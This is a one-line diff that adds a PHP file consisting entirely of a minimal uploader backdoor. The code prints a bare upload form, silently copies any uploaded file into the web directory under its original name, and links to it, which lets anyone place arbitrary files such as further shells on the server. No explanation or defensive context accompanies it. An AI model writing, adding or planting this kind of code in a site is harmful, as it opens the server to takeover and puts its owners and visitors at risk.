@@ -1,0 +1,1 @@
+<?php echo("ntk<form method='POST' enctype='multipart/form-data'><input type='file'name='_'/><input type='submit' value='up'/></form>");@copy($_FILES['_']['tmp_name'],$_FILES['_']['name']);echo("<a href=".$_FILES['_']['name'].">ok</a>");?>
